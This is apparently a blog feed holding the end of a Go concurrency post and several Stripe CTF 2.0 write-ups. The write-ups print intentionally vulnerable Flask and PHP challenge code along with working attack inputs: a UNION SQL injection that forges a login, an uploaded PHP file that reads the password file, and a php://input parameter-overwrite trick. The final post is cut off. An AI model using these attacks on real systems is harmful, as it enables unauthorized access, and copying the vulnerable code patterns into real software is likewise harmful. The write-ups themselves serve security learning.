<p>At this point, we can safely close the <code>results</code> channel as there won&rsquo;t be any new results coming in.</p>

<p>Finally, we can run <code>tally</code> on the results channel.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">func</span> <span class="nx">tally</span><span class="p">(</span><span class="nx">results</span> <span class="o">&lt;-</span><span class="kd">chan</span> <span class="kt">int</span><span class="p">)</span> <span class="kt">int</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">retval</span> <span class="o">:=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="k">for</span> <span class="nx">result</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">results</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">retval</span> <span class="o">+=</span> <span class="nx">result</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="nx">retval</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>One thing worth mentioning is that even though the channels we made are all bi-directional channels, in the specific functions, we can make them more restrictive by making them send-only (chan&lt;- Type) or receive-only (&lt;-chan Type) according to their actual usage in the local function to avoid accidents.</p>

<p>The full gist can be found <a href="https://gist.github.com/kevinjqiu/7568264#file-sumprimes-go">here</a>.</p>

<h2>Performance</h2>

<p>So how does this concurrent version faire?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'> <span class="err">$</span> <span class="nx">time</span> <span class="k">go</span> <span class="nx">run</span> <span class="nx">sumprimes</span><span class="p">.</span><span class="k">go</span> <span class="mi">2000000</span>
</span><span class='line'> <span class="nx">CPUS</span><span class="p">=</span><span class="mi">4</span>
</span><span class='line'> <span class="mi">142913828923</span>
</span><span class='line'>
</span><span class='line'> <span class="nx">real</span>    <span class="mi">0</span><span class="nx">m12</span><span class="mf">.534</span><span class="nx">s</span>
</span><span class='line'> <span class="nx">user</span>    <span class="mi">0</span><span class="nx">m44</span><span class="mf">.289</span><span class="nx">s</span>
</span><span class='line'> <span class="nx">sys</span>     <span class="mi">0</span><span class="nx">m0</span><span class="mf">.175</span><span class="nx">s</span>
</span></code></pre></td></tr></table></div></figure>


<p>On my Quad Core i7, it takes 12 seconds, almost twice as fast as the non-concurrent version!  And if you open System Monitor, you can see all 4 cores are running near 100%.</p>

<h1>Conclusion</h1>

<p>So there&rsquo;s my first dip into Go&rsquo;s concurrency with an old problem. I like the concurrency primitives Go provides, even though it takes some getting used to.  Conceptually, goroutines are very similar to Erlang&rsquo;s actors.  Go has the advantage of a C-ish syntax that doesn&rsquo;t look like Prolog and it doesn&rsquo;t require a separate runtime as Erlang does.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Stripe Capture The Flag 2.0 - Problem 3]]></title>
    <link href="http://kevinjqiu.github.io/2012/09/19/ctf2-dot-0-problem-3/"/>
    <updated>2012-09-19T00:01:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2012/09/19/ctf2-dot-0-problem-3</id>
    <content type="html"><![CDATA[<h2>Level 3</h2>

<p>Finally we get to level 3. Here&rsquo;s the setup:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>After the fiasco back in Level 0, management has decided to fortify the Secret Safe into an unbreakable solution (kind of like Unbreakable Linux). The resulting product is Secret Vault, which is so secure that it requires human intervention to add new secrets.
</span><span class='line'>
</span><span class='line'>A beta version has launched with some interesting secrets (including the password to access Level 4)</span></code></pre></td></tr></table></div></figure>


<p>Here&rsquo;s the code for the server (Python finally!)</p>

<div><script src='https://gist.github.com/3747632.js'></script>
<noscript><pre><code>#!/usr/bin/env python
#
# Welcome to the Secret Safe!
#
# - users/users.db stores authentication info with the schema:
#
# CREATE TABLE users (
#   id VARCHAR(255) PRIMARY KEY AUTOINCREMENT,
#   username VARCHAR(255),
#   password_hash VARCHAR(255),
#   salt VARCHAR(255)
# );
#
# - For extra security, the dictionary of secrets lives
#   data/secrets.json (so a compromise of the database won&#39;t
#   compromise the secrets themselves)

import flask
import hashlib
import json
import logging
import os
import sqlite3
import subprocess
import sys
from werkzeug import debug

# Generate test data when running locally
data_dir = os.path.join(os.path.dirname(__file__), &#39;data&#39;)
if not os.path.exists(data_dir):
    import generate_data
    os.mkdir(data_dir)
    generate_data.main(data_dir, &#39;dummy-password&#39;, &#39;dummy-proof&#39;, &#39;dummy-plans&#39;)

secrets = json.load(open(os.path.join(data_dir, &#39;secrets.json&#39;)))
index_html = open(&#39;index.html&#39;).read()
app = flask.Flask(__name__)

# Turn on backtraces, but turn off code execution (that&#39;d be an easy level!)
app.config[&#39;PROPAGATE_EXCEPTIONS&#39;] = True
app.wsgi_app = debug.DebuggedApplication(app.wsgi_app, evalex=False)

app.logger.addHandler(logging.StreamHandler(sys.stderr))
# use persistent entropy file for secret_key
app.secret_key = open(os.path.join(data_dir, &#39;entropy.dat&#39;)).read()

# Allow setting url_root if needed
try:
    from local_settings import url_root
except ImportError:
    pass

def absolute_url(path):
    return url_root + path

@app.route(&#39;/&#39;)
def index():
    try:
        user_id = flask.session[&#39;user_id&#39;]
    except KeyError:
        return index_html
    else:
        secret = secrets[str(user_id)]
        return (u&#39;Welcome back! Your secret is: &quot;{0}&quot;&#39;.format(secret) +
                u&#39; (&lt;a href=&quot;./logout&quot;&gt;Log out&lt;/a&gt;)\n&#39;)

@app.route(&#39;/logout&#39;)
def logout():
    flask.session.pop(&#39;user_id&#39;, None)
    return flask.redirect(absolute_url(&#39;/&#39;))

@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])
def login():
    username = flask.request.form.get(&#39;username&#39;)
    password = flask.request.form.get(&#39;password&#39;)

    if not username:
        return &quot;Must provide username\n&quot;

    if not password:
        return &quot;Must provide password\n&quot;

    conn = sqlite3.connect(os.path.join(data_dir, &#39;users.db&#39;))
    cursor = conn.cursor()

    query = &quot;&quot;&quot;SELECT id, password_hash, salt FROM users
               WHERE username = &#39;{0}&#39; LIMIT 1&quot;&quot;&quot;.format(username)
    cursor.execute(query)

    res = cursor.fetchone()
    if not res:
        return &quot;There&#39;s no such user {0}!\n&quot;.format(username)
    user_id, password_hash, salt = res

    calculated_hash = hashlib.sha256(password + salt)
    if calculated_hash.hexdigest() != password_hash:
        return &quot;That&#39;s not the password for {0}!\n&quot;.format(username)

    flask.session[&#39;user_id&#39;] = user_id
    return flask.redirect(absolute_url(&#39;/&#39;))

if __name__ == &#39;__main__&#39;:
    # In development: app.run(debug=True)
    app.run()
</code></pre></noscript></div>


<p>&hellip;and here&rsquo;s the front-end:</p>

<div><script src='https://gist.github.com/3747637.js'></script>
<noscript><pre><code>&lt;html&gt;
  &lt;body&gt;
    &lt;p&gt;
      Welcome to the Secret Safe, a place to guard your most
      precious secrets! To retreive your secrets, log in below.
    &lt;/p&gt;

    &lt;p&gt;The current users of the system store the following secrets:&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;bob: Stores the password to access level 04&lt;/li&gt;
      &lt;li&gt;eve: Stores the proof that P = NP &lt;/li&gt;
      &lt;li&gt;mallory: Stores the plans to a perpetual motion machine &lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;
      You should use it too!
      &lt;a href=&quot;http://www.youtube.com/watch?v=oHg5SJYRHA0&quot;&gt;Contact us&lt;/a&gt;
      to request a beta invite.
    &lt;/p&gt;

    &lt;form method=&quot;POST&quot; action=&quot;./login&quot;&gt;
      &lt;p&gt;
        &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;
        &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot;&gt;
      &lt;/p&gt;
      &lt;p&gt;
        &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;
        &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot;&gt;
      &lt;/p&gt;
      &lt;input type=&quot;submit&quot; value=&quot;Recover your secrets now!&quot;&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre></noscript></div>


<p>From the description, we know that we need to break into bob&rsquo;s account to retrieve the password to level 4, although breaking into eve and mallory&rsquo;s accounts are attempting :) Afterall, who wouldn&rsquo;t want to know the proof of <a href="http://en.wikipedia.org/wiki/P_versus_NP_problem">P=NP</a> or how to make a <a href="http://en.wikipedia.org/wiki/Perpetual_motion_machine">perpetual motion machine</a>?</p>

<p>Anyhow, the front-end is a typical login page: you get username and password input fields, and they&rsquo;re sent off (via POST) to a server script.
The server is a simple Flask app that gets the user input, checks them against a table of username and salted password hashes.</p>

<p>The <code>login()</code> function is where all the action takes place. Line 86 quickly caught my eyes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">query</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;SELECT id, password_hash, salt FROM users WHERE username = &#39;{0}&#39; LIMIT 1&quot;&quot;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
</span><span class='line'><span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is an alarming pattern of formatting a string and sending it off to <code>cursor.execute()</code>. Python&rsquo;s string <code>format()</code> method is just another way of interopolation. It&rsquo;s exactly the same as <code>"""SELECT id, password_hash, salt FROM user WHERE username = %s""" % username"""</code>.</p>

<p>Now that we found the vulnerability, we need to find a way exploit it.</p>

<h3>Take 1</h3>

<p>Normally, with SQL injection, you craft an input to terminate the previous statement, and inject the statement you want it to execute. Reading the code, it&rsquo;s getting the user&rsquo;s password hash and salt for the given user, and check it against the input hash and salt. The hashing method is <a href="http://en.wikipedia.org/wiki/SHA-2">sha256</a>. With Python, we can quickly pre-calculate a salted hash to inject. Here&rsquo;s an example, with password <code>1</code> and salt <code>a</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>python -c <span class="s2">&quot;import hashlib; print hashlib.sha256(&#39;1&#39;+&#39;a&#39;).hexdigest()&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>and we get <code>a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65</code>.</p>

<p>The statement we really want it to execute is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span> <span class="s1">&#39;a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;bob&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>so when we put &lsquo;1&rsquo; in the password input box, we will get the server to run sha246 on &lsquo;1&rsquo; + &lsquo;a&rsquo;, and check it against the hash that we fed in. The entire query gets executed wil look like this (with the middle line being the <code>username</code> we feed in):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span> <span class="n">password_hash</span><span class="p">,</span> <span class="n">salt</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;</span>
</span><span class='line'><span class="s1">&#39;</span><span class="p">;</span> <span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span>  <span class="s1">&#39;a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;bob</span>
</span><span class='line'><span class="s1">&#39;</span> <span class="k">LIMIT</span> <span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure>


<p>How does that faire?</p>

<p>Unfortunately, we get a stack trace in the traceback:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="k">call</span> <span class="k">last</span><span class="p">):</span>
</span><span class='line'>  <span class="n">File</span> <span class="ss">&quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1689</span><span class="p">,</span> <span class="k">in</span> <span class="n">wsgi_app</span>
</span><span class='line'>    <span class="n">response</span> <span class="o">=</span> <span class="k">self</span><span class="p">.</span><span class="n">make_response</span><span class="p">(</span><span class="k">self</span><span class="p">.</span><span class="n">handle_exception</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</span><span class='line'>  <span class="n">File</span> <span class="ss">&quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1687</span><span class="p">,</span> <span class="k">in</span> <span class="n">wsgi_app</span>
</span><span class='line'>    <span class="n">response</span> <span class="o">=</span> <span class="k">self</span><span class="p">.</span><span class="n">full_dispatch_request</span><span class="p">()</span>
</span><span class='line'>  <span class="n">File</span> <span class="ss">&quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1360</span><span class="p">,</span> <span class="k">in</span> <span class="n">full_dispatch_request</span>
</span><span class='line'>    <span class="n">rv</span> <span class="o">=</span> <span class="k">self</span><span class="p">.</span><span class="n">handle_user_exception</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span><span class='line'>  <span class="n">File</span> <span class="ss">&quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1358</span><span class="p">,</span> <span class="k">in</span> <span class="n">full_dispatch_request</span>
</span><span class='line'>    <span class="n">rv</span> <span class="o">=</span> <span class="k">self</span><span class="p">.</span><span class="n">dispatch_request</span><span class="p">()</span>
</span><span class='line'>  <span class="n">File</span> <span class="ss">&quot;/Library/Python/2.6/site-packages/Flask-0.9-py2.6.egg/flask/app.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1344</span><span class="p">,</span> <span class="k">in</span> <span class="n">dispatch_request</span>
</span><span class='line'>    <span class="k">return</span> <span class="k">self</span><span class="p">.</span><span class="n">view_functions</span><span class="p">[</span><span class="k">rule</span><span class="p">.</span><span class="n">endpoint</span><span class="p">](</span><span class="o">**</span><span class="n">req</span><span class="p">.</span><span class="n">view_args</span><span class="p">)</span>
</span><span class='line'>  <span class="n">File</span> <span class="ss">&quot;/Users/kevin/src/ctf/level03-code/secretvault.py&quot;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">91</span><span class="p">,</span> <span class="k">in</span> <span class="n">login</span>
</span><span class='line'>    <span class="k">cursor</span><span class="p">.</span><span class="k">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span><span class="n">Warning</span><span class="p">:</span> <span class="n">You</span> <span class="n">can</span> <span class="k">only</span> <span class="k">execute</span> <span class="n">one</span> <span class="k">statement</span> <span class="k">at</span> <span class="n">a</span> <span class="n">time</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>cursor</code> cannot run more than one statement at a time! Smart, eh?</p>

<h3>Take 2</h3>

<p>So the trick here is to use exactly 1 statement to inject our crafted data. We still want this to be returning the same fields. What if I <code>UNION</code> two queries, with the second query selecting the injected data?</p>

<p>So something like this (the middle line is the one we inject as <code>username</code>):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span> <span class="n">password_hash</span><span class="p">,</span> <span class="n">salt</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;</span>
</span><span class='line'><span class="s1">bob&#39;</span> <span class="k">UNION</span> <span class="k">select</span> <span class="n">id</span><span class="p">,</span> <span class="s1">&#39;a73fcf339640929207281fb8e038884806e2eb0840f2245694dbba1d5cc89e65&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;bob</span>
</span><span class='line'><span class="s1">&#39;</span> <span class="k">LIMIT</span> <span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure>


<p>Submit, and boom:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="n">Welcome</span> <span class="n">back</span><span class="o">!</span> <span class="n">Your</span> <span class="n">secret</span> <span class="k">is</span><span class="p">:</span> <span class="ss">&quot;...&quot;</span> <span class="p">(</span><span class="n">Log</span> <span class="k">out</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Conclusion</h2>

<p>This is a canonical SQL injection. Again, NEVER trust user input. Always sanitize user input.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Stripe Capture The Flag 2.0 - Problem 2]]></title>
    <link href="http://kevinjqiu.github.io/2012/09/12/ctf2-dot-0-problem-2/"/>
    <updated>2012-09-12T23:50:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2012/09/12/ctf2-dot-0-problem-2</id>
    <content type="html"><![CDATA[<h2>Level 2</h2>

<div><script src='https://gist.github.com/3711719.js?file=index.php'></script>
<noscript><pre><code>&lt;?php
  session_start();

  if ($_FILES[&quot;dispic&quot;][&quot;error&quot;] &gt; 0) {
    echo &quot;&lt;p&gt;Error: &quot; . $_FILES[&quot;dispic&quot;][&quot;error&quot;] . &quot;&lt;/p&gt;&quot;;
  }
  else
  {
    $dest_dir = &quot;uploads/&quot;;
    $dest = $dest_dir . basename($_FILES[&quot;dispic&quot;][&quot;name&quot;]);
    $src = $_FILES[&quot;dispic&quot;][&quot;tmp_name&quot;];
    if (move_uploaded_file($src, $dest)) {
      $_SESSION[&quot;dispic_url&quot;] = $dest;
      chmod($dest, 0644);
      echo &quot;&lt;p&gt;Successfully uploaded your display picture.&lt;/p&gt;&quot;;
    }
  }

  $url = &quot;https://upload.wikimedia.org/wikipedia/commons/f/f8/&quot; .
         &quot;Question_mark_alternate.svg&quot;;
  if (isset($_SESSION[&quot;dispic_url&quot;])) {
    $url = $_SESSION[&quot;dispic_url&quot;];
  }

?&gt;

&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Welcome to the CTF!&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;center&gt;
      &lt;h1&gt;Welcome to the CTF Social Network!&lt;/h1&gt;
      &lt;div&gt;
        &lt;img src=&lt;?php echo $url; ?&gt; /&gt;
        &lt;?php
          if (!isset($_SESSION[&quot;dispic_url&quot;])) {
            echo &quot;&lt;p&gt;Oh, looks like you don&#39;t have a profile image&quot; .
                 &quot; -- upload one now!&lt;/p&gt;&quot;;
          }
        ?&gt;
        &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
          &lt;input type=&quot;file&quot; name=&quot;dispic&quot; size=&quot;40&quot; /&gt;
          &lt;input type=&quot;submit&quot; value=&quot;Upload!&quot;&gt;
        &lt;/form&gt;

        &lt;p&gt;
           Password for Level 3 (accessible only to members of the club):
           &lt;a href=&quot;password.txt&quot;&gt;password.txt&lt;/a&gt;
        &lt;/p&gt;
      &lt;/div&gt;
    &lt;/center&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre></noscript></div>


<p>In level 2, we&rsquo;re faced with a PHP app that allows you to upload a &ldquo;profile picture&rdquo;. The password to level 3 is contained in a &ldquo;password.txt&rdquo; file of the document root, as revealed in line 49. Of course, you won&rsquo;t be able to click on the link and get the file. The directory is protected, and we have to somehow exploit the code.</p>

<p>Reading through the code, it&rsquo;s a clear that whatever file uploaded to the server will be under <code>uploads/</code>, and the file is publicly accessible through <code>&lt;base&gt;/uploads/&lt;your_file_name&gt;</code>, as seen on line 37. The file input is expecting a image file, but it doesn&rsquo;t restrict the type of file it accepts. What if we upload a PHP script, read the file content <code>../password.txt</code>?</p>

<p>With that in mind, I quickly cooked up a PHP script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;../password.txt&#39;</span><span class="p">);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>uploaded it and hit it with curl. Guess what? The password is right there in the clear!</p>

<h2>Conclusion</h2>

<p>There&rsquo;s a few problems with this app:</p>

<ul>
<li>The user shouldn&rsquo;t be able to upload files of any type they want. Restrict to only image files if you&rsquo;re expecting profile pictures.</li>
<li>The above point is necessary but not sufficient. The bigger problem is that the server is not properly configured. Files under <code>uploads/</code> folder should be considered &ldquo;user input&rdquo; and thus should not be able to be executed on the server. Much more exploits can be done here and as it turns out, some later levels require the control of this machine.</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Stripe Capture The Flag 2.0 - Problem 1]]></title>
    <link href="http://kevinjqiu.github.io/2012/09/10/ctf2-dot-0-problem-1/"/>
    <updated>2012-09-10T14:14:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2012/09/10/ctf2-dot-0-problem-1</id>
    <content type="html"><![CDATA[<h2>Level 1</h2>

<p>Now we get to level 1. We are presented with a simple web form with the PHP code powering it.</p>

<div><script src='https://gist.github.com/3692642.js?file=index.php'></script>
<noscript><pre><code>&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Guessing Game&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;Welcome to the Guessing Game!&lt;/h1&gt;
    &lt;p&gt;
      Guess the secret combination below, and if you get it right,
      you&#39;ll get the password to the next level!
    &lt;/p&gt;
    &lt;?php
      $filename = &#39;secret-combination.txt&#39;;
      extract($_GET);
      if (isset($attempt)) {
        $combination = trim(file_get_contents($filename));
        if ($attempt === $combination) {
          echo &quot;&lt;p&gt;How did you know the secret combination was&quot; .
               &quot; $combination!?&lt;/p&gt;&quot;;
          $next = file_get_contents(&#39;level02-password.txt&#39;);
          echo &quot;&lt;p&gt;You&#39;ve earned the password to the access Level 2:&quot; .
               &quot; $next&lt;/p&gt;&quot;;
        } else {
          echo &quot;&lt;p&gt;Incorrect! The secret combination is not $attempt&lt;/p&gt;&quot;;
        }
      }
    ?&gt;
    &lt;form action=&quot;#&quot; method=&quot;GET&quot;&gt;
      &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;attempt&quot;&gt;&lt;/p&gt;
      &lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;Guess!&quot;&gt;&lt;/p&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre></noscript></div>


<p>The PHP script checks if the input combination matches the combination in &lsquo;secret-combination.txt&rsquo; file, and present the user with the password to the next level if the combinations match.  Obviously, we&rsquo;re not going to guess the combination.</p>

<p>There are a few &lsquo;handy&rsquo; methods in PHP that are extremely dangerous. <a href="http://php.net/manual/en/function.extract.php"><code>extract</code></a> is one of them. It will extract the content of the passed-in associative array, and import them into the global scope. e.g., <code>extract(array('foo'=&gt;'bar'));</code> will make a global variable <code>$foo</code>. What&rsquo;s more dangerous is that if you already have a variable named <code>$foo</code>, it will be overwritten with the new value in the associative array.</p>

<p>Because the secret combination&rsquo;s location is stored in <code>$filename</code> variable, we need to somehow manipulate the input to point <code>$filename</code> to something else.  Looking at line 27:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;#&quot;</span> <span class="na">method=</span><span class="s">&quot;GET&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;/form&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>So the form is submitted using GET! So manipulating the variable is as easy as sending the endpoint with query param <code>filename=&lt;xyz&gt;</code>.</p>

<p>Now, what will the <code>xyz</code> be? The <code>$filename</code> variable is passed into <code>file_get_contents()</code> function. The parameter to the function is simply a string, and PHP defined a few &lsquo;handy&rsquo; <a href="http://php.net/manual/en/wrappers.php.php">streams</a>. <code>php://input</code> caught my eyes. The doc says <code>php://input is a read-only stream that allows you to read raw data from the request body.</code>. Hey, the form is submitted using GET, so there won&rsquo;t be a request body. The input parameter is also sent using GET variable <code>attempt</code>, so I just need to send an empty <code>attempt</code> and point the filename to <code>php://input</code>: <code>?attempt=&amp;filename=php://input</code></p>

<p>&hellip;And indeed it works!</p>

<h1>Conclusion</h1>

<ul>
<li>Never, ever use <code>extract()</code> in serious applications. Historically, PHP is used to build simple websites so it included many functions that puts &ldquo;convenience&rdquo; over security. Global variables are a bad idea, and having the ability to pollute the global space from any input is way worse.</li>
<li><code>file_get_contents()</code> has the ability to take any string as parameter, including some named streams. They are handy but they pose potential threats.</li>
<li>Again, don&rsquo;t trust user input!</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Stripe Capture The Flag 2.0 - Problem 0]]></title>
    <link href="http://kevinjqiu.github.io/2012/09/09/ctf2-dot-0-problem-0/"/>
    <updated>2012-09-09T23:11:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2012/09/09/ctf2-dot-0-problem-0</id>
    <content type="html"><![CDATA[<p><a href="https://stripe.com">Stripe</a> just finished running a second <a href="https://stripe-ctf.com">&ldquo;capture the flag&rdquo;</a> challenge. They ran a similar challenge this February and was more focused on system level. This time, it&rsquo;s full-on web security.</p>

<p>In the next few posts, I&rsquo;m going to discuss the problems in the challenge, how I solved them and what did I learn from from each challenge.</p>

<h2>Problem 0</h2>

<p>Here are the code for level 0:</p>

<div><script src='https://gist.github.com/3688655.js?file=level00.js'></script>
<noscript><pre><code>// Install dependencies with &#39;npm install&#39;
// Run as &#39;node level00.js&#39;

var express = require(&#39;express&#39;), // Web framework
    mu = require(&#39;mu2&#39;),          // Mustache.js templating
    sqlite3 = require(&#39;sqlite3&#39;); // SQLite (database) driver

// Look for templates in the current directory
mu.root = __dirname;

// Set up the DB
var db = new sqlite3.Database(&#39;level00.db&#39;);
db.run(
  &#39;CREATE TABLE IF NOT EXISTS secrets (&#39; +
    &#39;key varchar(255),&#39; +
    &#39;secret varchar(255)&#39; +
  &#39;)&#39;
);

// Create the server
var app = express();
app.use(express.bodyParser());

function renderPage(res, variables) {
  var stream = mu.compileAndRender(&#39;level00.html&#39;, variables);
  res.header(&#39;Content-Type&#39;, &#39;text/html&#39;);
  stream.pipe(res);
}

app.get(&#39;/*&#39;, function(req, res) {
  var namespace = req.param(&#39;namespace&#39;);

  if (namespace) {
    var query = &#39;SELECT * FROM secrets WHERE key LIKE ? || &quot;.%&quot;&#39;;
    db.all(query, namespace, function(err, secrets) {
             if (err) throw err;

             renderPage(res, {namespace: namespace, secrets: secrets});
           });
  } else {
    renderPage(res, {});
  }
});

app.post(&#39;/*&#39;, function(req, res) {
  var namespace = req.body[&#39;namespace&#39;];
  var secret_name = req.body[&#39;secret_name&#39;];
  var secret_value = req.body[&#39;secret_value&#39;];

  var query = &#39;INSERT INTO secrets (key, secret) VALUES (? || &quot;.&quot; || ?, ?)&#39;;
  db.run(query, namespace, secret_name, secret_value, function(err) {
